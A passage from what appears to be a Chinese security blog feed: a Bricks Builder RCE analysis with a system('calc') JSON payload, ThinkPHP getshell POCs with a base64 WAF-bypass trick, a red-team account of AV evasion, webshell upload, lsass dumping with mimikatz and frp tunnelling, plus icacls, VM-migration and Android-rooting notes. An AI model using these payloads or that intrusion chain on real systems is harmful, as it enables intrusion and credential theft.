127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 270</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate, </span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;postId&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;nonce&quot;: &quot; a980a714d9&quot;,</span><br><span class="line">    &quot;element&quot;: &#123;</span><br><span class="line">        &quot;name&quot;: &quot;container&quot;,</span><br><span class="line">        &quot;settings&quot;: &#123;</span><br><span class="line">            &quot;hasLoop&quot;: &quot;&quot;,</span><br><span class="line">            &quot;query&quot;: &#123;&quot;useQueryEditor&quot;: &quot;&quot;,&quot;queryEditor&quot;: &quot;system(&#x27;calc&#x27;);&quot;,&quot;objectType&quot;: &quot;&quot;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时我们变成了实例化类Bricks\Element_Container，进到Element_Container类中，可以看到它是继承父类Element，也就是说它能调用的方法不光在它中，还可能在父类中，回到ajax.php，我们看下new $element_class_name( $element )之后的代码，调用了2个方法load和init，其中init在父类Element中，并且init中调用了方法render，然后render中实例化了类Query，满足上面我们分析的条件<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/14.png" alt="image">  </p><h2 id="03-对应路由"><a href="#03-对应路由" class="headerlink" title="03 对应路由"></a>03 对应路由</h2><p>回到ajax.php，从注释中就能看到，一段是处理AJAX请求，一段是处理REST API请求<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/15.png" alt="image">  </p><h2 id="04-权限绕过"><a href="#04-权限绕过" class="headerlink" title="04 权限绕过"></a>04 权限绕过</h2><p>可以看到代码AJAX中有权限检验，代码REST API中看似没有权限检验，但注释中说了，权限检查在API-&gt;render_element_permissions_check()中，跟进render_element_permissions_check后发现，内部其实没进行权限检查，只校验了nonce<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16.png" alt="image"><br>wordpress中明确提到，nonce不应作为权限验证，最终导致权限绕过<br><img src="/2025/01/06/CVE-2024-25600-WordPress-Bricks-Builder%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/17.png" alt="image">  </p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>漏洞出现在后台的编辑器功能处，用于渲染元素并且预览效果，由于弱权限校验导致权限绕过可直接访问REST API端点，最终导致RCE，最后，感谢ID为zero的师傅分享的源码</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>漏洞发现者对漏洞的分析，总体行，细节不行<br><a href="https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6">https://snicco.io/vulnerability-disclosure/bricks/unauthenticated-rce-in-bricks-1-9-6</a>  </p><p>补天上一篇还不错的文章<br><a href="https://forum.butian.net/share/2814">https://forum.butian.net/share/2814</a>  </p><p>CSDN上一篇还不错的文章<br><a href="https://blog.csdn.net/shelter1234567/article/details/136503993">https://blog.csdn.net/shelter1234567/article/details/136503993</a>  </p><p>AJAX和REST API<br><a href="https://www.runoob.com/php/php-restful.html">https://www.runoob.com/php/php-restful.html</a><br><a href="https://www.runoob.com/php/php-ajax-php.html">https://www.runoob.com/php/php-ajax-php.html</a>  </p><p>其他质量不高的文章我就不贴了  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;朋友圈看到有人转发了一篇“CVE-2024-25600：WordPress Bricks Builder RCE”，感觉挺有意思，点进去看了</summary>
      
    
    
    
    <category term="漏洞研究" scheme="http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="PHP" scheme="http://example.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Parallels Desktop虚拟机（PD虚拟机）迁移到VMware Workstation</title>
    <link href="http://example.com/2024/12/29/Parallels-Desktop%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88PD%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89%E8%BF%81%E7%A7%BB%E5%88%B0VMware-Workstation/"/>
    <id>http://example.com/2024/12/29/Parallels-Desktop%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88PD%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89%E8%BF%81%E7%A7%BB%E5%88%B0VMware-Workstation/</id>
    <published>2024-12-29T14:01:44.000Z</published>
    <updated>2025-07-31T00:55:54.628Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工作需要，去现场干活但不能用自己的电脑，考虑将我平时用的虚拟机拷贝过去，但我是intel mac下使用parallels desktop虚拟化的win10，现场是windows机器，pd虚拟机无法导入vmware workstation中，google、知乎、v2ex上各种搜索，不是不完整，就是不可用，最终通过自己尝试和国外一篇博客发现可行的方法，本文记录一下</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>整体思路是，mac下vmware fusion导入pd虚拟机，vmware fusion中将虚拟机导出为ovf格式，最终导入vmware workstation中</p><h2 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1"></a>步骤1</h2><p>mac下安装好vmware fusion，截止到2024年12月22日，vmware fusion已经免费了，现在连破解许可都不用找了</p><h2 id="步骤2"><a href="#步骤2" class="headerlink" title="步骤2"></a>步骤2</h2><p>vmware fusion直接导入pd虚拟机会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error23 无法导入虚拟机</span><br></pre></td></tr></table></figure><p>需要使用qemu-img转换一下格式，安装qemu-img命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install qemu</span><br></pre></td></tr></table></figure><p>我这边安装过程中提示还需要安装什么xcode(记不清了…)，需要一并安装，安装后使用如下命令转换（转换之前，虚拟机需要关机）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-img convert -f parallels -O vmdk Win11-开发-0.hdd.0.&#123;5fbaabe3-6958-40ff-92a7-860e329aab41&#125;.hds win11.vmdk</span><br></pre></td></tr></table></figure><p>不知是否注意到，转换的不是.pvm文件，而是.hds文件，pvm文件-&gt;右键-&gt;显示包内容，将里面的.hdd文件拖出来，hdd文件-&gt;右键-&gt;显示包内容，将里面的.hds文件拖出来，这个地方让我伤到了，一开始转换pvm失败，后来转换hdd还是失败，想不到里面还有一个hds…</p><p>这里还有一个小坑点，hdd文件显示包内容后，可能会有两个hds文件，如果有2个，那另一个是你的快照，对比没有快照的pvm文件，里面只有一个hds文件</p><p>转换后，vmware fusion新建虚拟机，使用刚才生成的vmdk文件作为磁盘，可以成功导入</p><h2 id="步骤3"><a href="#步骤3" class="headerlink" title="步骤3"></a>步骤3</h2><p>vmware fusion中将虚拟机导出为ovf格式，最终导入vmware workstation中<br><img src="/2024/12/29/Parallels-Desktop%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88PD%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89%E8%BF%81%E7%A7%BB%E5%88%B0VMware-Workstation/02.png" alt="image">  </p><h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>隐约记得vmware workstation中是可以直接导入vmdk格式的文件，尝试一下，vmware workstation中，新建虚拟机-&gt;自定义虚拟机，一路下一步，创建硬盘时选择之前的vmdk文件，经测试，可成功导入<br><img src="/2024/12/29/Parallels-Desktop%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%88PD%E8%99%9A%E6%8B%9F%E6%9C%BA%EF%BC%89%E8%BF%81%E7%A7%BB%E5%88%B0VMware-Workstation/03.png" alt="image">  </p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.reddit.com/r/vmware/comments/1dvrkye/how_to_move_from_parallels_to_vmware/?rdt=39473">https://www.reddit.com/r/vmware/comments/1dvrkye/how_to_move_from_parallels_to_vmware/?rdt=39473</a></p><p><a href="https://chrisdooks.com/2024/05/15/import-a-parallels-vm-into-vmware-fusion-pro/">https://chrisdooks.com/2024/05/15/import-a-parallels-vm-into-vmware-fusion-pro/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;工作需要，去现场干活但不能用自己的电脑，考虑将我平时用的虚拟机拷贝过去，但我是intel mac下使用parallels desktop虚拟</summary>
      
    
    
    
    <category term="系统运维" scheme="http://example.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
    
    
    <category term="虚拟机迁移" scheme="http://example.com/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP GetShell WAF绕过</title>
    <link href="http://example.com/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/</id>
    <published>2024-11-18T12:38:34.000Z</published>
    <updated>2025-08-14T14:05:57.277Z</updated>
    
    <content type="html"><![CDATA[<p>分享一个ThinkPHP GetShell时WAF绕过的小技巧</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>以如下POC为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=captcha&amp;test=-1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">s=file_put_contents(&#x27;system.php&#x27;,&#x27;&lt;?php phpinfo();&#x27;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</span><br></pre></td></tr></table></figure><p>可能绕过WAF的POC为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /?s=captcha&amp;test=-1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">s=file_put_contents(&#x27;system.php&#x27;,&#x27;&lt;?php file_put_contents(&quot;todoback.php&quot;,base64_decode(&quot;垃圾字符&quot;));?&gt;&#x27;)&amp;_method=__construct&amp;method=POST&amp;filter[]=assert</span><br></pre></td></tr></table></figure><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/01.png" alt="image"><br>官方文档中提到，使用base64_decode解码但不指定第二个参数$strict时，base64字符集以外的字符将被忽略，由此我们可以利用它来插入大量垃圾字符</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><p>Ubuntu22.04 + 宝塔（Nginx1.24.0 + PHP5.6.40）</p><p>先测试合法base64字符，代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &#x27;VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==&#x27;;</span><br><span class="line">echo base64_decode($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问后，输出如下图<br><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/02.png" alt="image">  </p><p>测试插入非法base64字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &#x27;VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==***&#x27;;</span><br><span class="line">echo base64_decode($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问后，输出如下图<br><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/03.png" alt="image">  </p><p>测试插入100万个非法base64字符，python脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;a.txt&quot;, &quot;w&quot;) as fw:</span><br><span class="line">    for i in range(1000000):</span><br><span class="line">        fw.write(&quot;*&quot;)</span><br></pre></td></tr></table></figure><p>代码如下<br><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/04.png" alt="image"><br>访问后，输出如下图<br><img src="/2024/11/18/ThinkPHP-GetShell-WAF%E7%BB%95%E8%BF%87/05.png" alt="image">  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;分享一个ThinkPHP GetShell时WAF绕过的小技巧&lt;/p&gt;
&lt;h1 id=&quot;POC&quot;&gt;&lt;a href=&quot;#POC&quot; class=&quot;headerlink&quot; title=&quot;POC&quot;&gt;&lt;/a&gt;POC&lt;/h1&gt;&lt;p&gt;以如下POC为例&lt;/p&gt;
&lt;figure class=</summary>
      
    
    
    
    <category term="攻防对抗" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="WAF绕过" scheme="http://example.com/tags/WAF%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>从shiro命令执行到远程桌面登录</title>
    <link href="http://example.com/2024/10/06/%E4%BB%8Eshiro%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%BD%95/"/>
    <id>http://example.com/2024/10/06/%E4%BB%8Eshiro%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%99%BB%E5%BD%95/</id>
    <published>2024-10-06T01:32:57.000Z</published>
    <updated>2025-08-14T14:00:44.897Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>一个shiro命令执行并且有回显的口子，直接打各类内存马均失败，powershell一句话上线CS失败，查看进程发现有360、火绒，考虑到内存马不是我的研究方向，从文件下载方向突破</p><h1 id="0x01-突破"><a href="#0x01-突破" class="headerlink" title="0x01 突破"></a>0x01 突破</h1><p>常规的文件下载方式bitsadmin、certutil、ftp等均被拦截，掏出储备的一个免杀的文件下载方式，可成功下载exe文件，尝试下载免杀远控并执行，发现无法执行（原因未知），改为下载魔改过的免杀冰蝎到对应的web目录下，成功连接webshell</p><h1 id="0x02-再突破"><a href="#0x02-再突破" class="headerlink" title="0x02 再突破"></a>0x02 再突破</h1><p>连接上webshell后，尝试执行远控仍旧失败，看来这条路行不通了，上传procdump抓取lsass的内存，想要下载到本地解密，发现不能下载（猜测可能是AV给拦截了），重新梳理下场景，想到既然是shiro的站点，那可以通过web服务下载文件，将文件移动到web目录后成功下载，随后通过mimikatz解出密码，密码真TM复杂啊，上传魔改过的免杀frp，建立隧道后，远程桌面成功连接</p><h1 id="0x03-优化"><a href="#0x03-优化" class="headerlink" title="0x03 优化"></a>0x03 优化</h1><p>远程桌面连接后，发现屏幕字体非常非常小，应该是我本机虚拟机的分辨率太高导致的，此时可以先修改本机的屏幕分辨率，再远程桌面连接后大小刚刚好，但是本机字体会非常非常大，且通过Win10自带的mstsc连接Windows Server 2008 R2时，是不能将密码拷贝到登录界面中，如果密码很复杂的话，不仅费力还容易出错，这里推荐使用UWP版本的远程桌面，可以先设置用户名密码再连接，也就是可以粘贴密码，在紧张的攻防中提供一些便利~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;一个shiro命令执行并且有回显的口子，直接打各类内存马均失败，powershell一句话上线CS失败，查看进程发现有360、火绒，考虑到内</summary>
      
    
    
    
    <category term="攻防对抗" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="免杀对抗" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80%E5%AF%B9%E6%8A%97/"/>
    
    <category term="Web打点" scheme="http://example.com/tags/Web%E6%89%93%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>Windows命令学习之ICACLS</title>
    <link href="http://example.com/2024/08/15/Windows%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0%E4%B9%8BICACLS/"/>
    <id>http://example.com/2024/08/15/Windows%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0%E4%B9%8BICACLS/</id>
    <published>2024-08-15T08:49:32.000Z</published>
    <updated>2025-08-14T14:06:28.944Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>看到一个免杀下载的方式，其中包含这样一条命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls %cd% /deny %username%:(OI)(CI)(DE,DC)</span><br></pre></td></tr></table></figure><p>之前没接触过icacls，通过这篇笔记好好学习一下</p><h1 id="0x02-介绍"><a href="#0x02-介绍" class="headerlink" title="0x02 介绍"></a>0x02 介绍</h1><p>icacls：修改文件（文件夹）的权限</p><p>icacls是cacls和xcacls的增强版（但我在win10中搜索了一下，只搜到cacls，没搜到xcacls）</p><p>windows中文件（文件夹）的权限分为2种：继承的权限（inherit permission）、明确设置的权限（explicit permission）</p><p>可通过执行icacls.exe %cd%来查看当前目录的权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin\Desktop&gt;icacls.exe %cd%</span><br><span class="line">C:\Users\admin\Desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)</span><br><span class="line">                       BUILTIN\Administrators:(I)(OI)(CI)(F)</span><br><span class="line">                       DESKTOP-T86MV1G\admin:(I)(OI)(CI)(F)</span><br><span class="line"></span><br><span class="line">已成功处理 1 个文件; 处理 0 个文件时失败</span><br></pre></td></tr></table></figure><p>具体想掌握它是干什么的，怎么使用它，需要耐心的查看下面几个文章：<br><a href="https://ss64.com/nt/icacls.html">https://ss64.com/nt/icacls.html</a><br><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls">https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls</a><br>cmd下执行icacls.exe /?查看用法帮助  </p><p>其中OI、CI、IO是只针对文件夹还是针对文件夹和文件，讲的不是很清楚，有时间测试一下</p><h1 id="0x03-用法"><a href="#0x03-用法" class="headerlink" title="0x03 用法"></a>0x03 用法</h1><p>回到最初那条命令，解释如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 设置当前用户对当前目录的权限为：禁止删除文件（文件夹）、子文件（子文件夹）</span><br><span class="line">icacls %cd% /deny %username%:(OI)(CI)(DE,DC)</span><br></pre></td></tr></table></figure><p>知道了什么含义，也有了上面学习的知识作为基础，我们可以写一个功能一样，形式不一样的命令，也算是一种免杀储备（暂未测试）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">icacls %cd% /deny %username%:(DE,DC) /T</span><br><span class="line">icacls %cd% /deny %username%:(OI)(CI)(D)</span><br><span class="line">icacls %cd% /deny %username%:D /T</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;看到一个免杀下载的方式，其中包含这样一条命令&lt;/p&gt;
&lt;figure class=&quot;highligh</summary>
      
    
    
    
    <category term="免杀研究" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="ICACLS" scheme="http://example.com/tags/ICACLS/"/>
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>移动端渗透测试环境搭建</title>
    <link href="http://example.com/2024/07/15/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>http://example.com/2024/07/15/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2024-07-15T08:47:10.000Z</published>
    <updated>2025-08-14T14:04:41.847Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>接到一个Android APP渗透的任务，尝试用模拟器抓包发现闪退，看来反模拟器，手里有一台手机，型号是OPPO A57 5G，系统是ColorOS 14，手机和电脑在同一WiFi下，安装好burp证书，配置好代理，尝试抓包，发现无法抓取https包，好吧，开启折腾之旅</p><p>oppo安装证书<br><a href="https://www.cnblogs.com/tianpin/p/17503604.html">https://www.cnblogs.com/tianpin/p/17503604.html</a>  </p><h1 id="0x02-手机降级"><a href="#0x02-手机降级" class="headerlink" title="0x02 手机降级"></a>0x02 手机降级</h1><p>查阅相关资料得知，安卓7.0开始，想抓https包需要将证书装到系统证书目录下，想装到系统证书目录下需要root权限，现在问题变成如何root</p><p>之前手欠将ColorOS升级到14，我们都知道版本越高越不利于root，所以第一步是降级，ColorOS官方规定，降级需要一级一级降，不能一次降多级，所以我们要先降到ColorOS 13，再降到ColorOS 12，由于ColorOS最低只能降到手机出厂时的系统，我这边最低只能降到ColorOS 12</p><p>ColorOS 14降级到ColorOS 13<br><a href="https://www.ithome.com/0/742/497.htm">https://www.ithome.com/0/742/497.htm</a><br>ColorOS 13降级到ColorOS 12<br><a href="https://bbs.oneplus.com/thread/6387108">https://bbs.oneplus.com/thread/6387108</a>  </p><h1 id="0x03-Root准备"><a href="#0x03-Root准备" class="headerlink" title="0x03 Root准备"></a>0x03 Root准备</h1><p>首先复习了一下adb、recovery、fastboot的知识，然后手机连上电脑，开启USB调试，尝试通过adb和fastboot连接手机，发现没有fastboot命令，下载Android Studio的SDK，里面的platform-tools目录下有我们需要的工具（像夜神模拟器安装目录下也有adb，但是没有fastboot）</p><p>adb连接手机<br><a href="https://blog.csdn.net/qq_42864343/article/details/123813339">https://blog.csdn.net/qq_42864343/article/details/123813339</a><br>使用fastboot命令刷机流程详解<br><a href="https://blog.csdn.net/s13383754499/article/details/82755012">https://blog.csdn.net/s13383754499/article/details/82755012</a><br>oppo开启usb调试<br><a href="https://baijiahao.baidu.com/s?id=1750732106730743094&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1750732106730743094&amp;wfr=spider&amp;for=pc</a><br>【2021】解决 Android Studio下载SDK失败 问题<br><a href="https://blog.csdn.net/weixin_43461724/article/details/120706675">https://blog.csdn.net/weixin_43461724/article/details/120706675</a>  </p><h1 id="0x04-成功Root"><a href="#0x04-成功Root" class="headerlink" title="0x04 成功Root"></a>0x04 成功Root</h1><p>查阅大量文章尝试root，发现OPPO A57 5G无法解锁BootLoader</p><p>oppo手机root<br><a href="https://www.shoujiroot.com/archives/146545.html">https://www.shoujiroot.com/archives/146545.html</a><br><a href="https://www.thenextdroid.com/oppo-a56s-root-without-pc-via-magisk/">https://www.thenextdroid.com/oppo-a56s-root-without-pc-via-magisk/</a>  </p><p>oppo a57刷机<br><a href="https://www.cnblogs.com/feiquan/p/9055823.html">https://www.cnblogs.com/feiquan/p/9055823.html</a><br><a href="https://blog.csdn.net/xgocn/article/details/107565522">https://blog.csdn.net/xgocn/article/details/107565522</a><br><a href="http://www.romgw.com/?p=334">http://www.romgw.com/?p=334</a>  </p><p>期间尝试刷机时碰到一个问题，我是mac系统下pd虚拟化的win10，无法将串口设备挂接到虚拟机，如下图<br><img src="/2024/07/15/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/01.png" alt="image">  </p><p>经历各种失败后，已经打算放弃了，想想再试一次万能的淘宝吧，搜了一下，还真有刷机业务并且可以刷OPPO A57 5G，不过mac系统下pd虚拟化的win10不行，需要物理机win10，然后又找了一台物理机win10，全程需要对方远程控制我电脑，很反感别人控制我电脑，好在那台物理机win10上面啥数据也没有，看对面一顿操作，最后成功root</p><p>通过观察他们的操作，发现他们其实是用的一款第三方付费工具UnlockTool，好像是一个越南团队开发的，这款工具其中一个root方式是利用联发科这款CPU的一个漏洞，正好OPPO A57 5G的CPU就是联发科</p><h1 id="0x05-成功抓包"><a href="#0x05-成功抓包" class="headerlink" title="0x05 成功抓包"></a>0x05 成功抓包</h1><p>手机root后成功安装了magisk，但是adb连接后权限还是shell，无法将证书装到系统证书目录下，尝试过Root Explorer，但是无法修改证书权限，最终通过magisk的模块MoveCertiticate成功将证书移到系统证书目录下，需要注意MoveCertiticate会从指定目录将证书移到系统证书目录下，所以需要先将证书放到/data/local/tmp/cert/下</p><p>另外有些app出于反调试目的，可能不走系统本身的代理，需要一款类似Proxifier的全局代理客户端，可以使用Postern</p><p>一切准备就绪后，尝试抓包，可成功抓到app的https包，如下图<br><img src="/2024/07/15/%E7%A7%BB%E5%8A%A8%E7%AB%AF%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/02.png" alt="image">  </p><p>移动端抓包<br><a href="https://xz.aliyun.com/t/11817?time__1311=Cq0xuD07u4lh=iQwYYv3iIPx7qEYoD">https://xz.aliyun.com/t/11817?time__1311=Cq0xuD07u4lh%3DiQwYYv3iIPx7qEYoD</a><br><a href="https://blog.csdn.net/Arched/article/details/135777104">https://blog.csdn.net/Arched/article/details/135777104</a><br><a href="https://github.com/ys1231/MoveCertificate">https://github.com/ys1231/MoveCertificate</a>  </p><h1 id="0x06-总结感悟"><a href="#0x06-总结感悟" class="headerlink" title="0x06 总结感悟"></a>0x06 总结感悟</h1><p>之前一直有一个问题，可以直接通过burp抓包，为何还要再通过charles或者fiddler中转一下，这次正好测试了一下，发现直接通过burp抓包，数据包从APP到burp需要好几秒，有点慢，而通过charles中转一下，则可以秒抓</p><p>最后，其实iOS下导入证书就可以抓https包，比Android省事多，所以条件允许的话，优先在iOS下抓包，但是像我这种没有iOS客户端的情况，就得折腾了~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h1&gt;&lt;p&gt;接到一个Android APP渗透的任务，尝试用模拟器抓包发现闪退，看来反模拟器，手里有一台手机，型</summary>
      
    
    
    
    <category term="攻防对抗" scheme="http://example.com/categories/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="移动端" scheme="http://example.com/tags/%E7%A7%BB%E5%8A%A8%E7%AB%AF/"/>
    
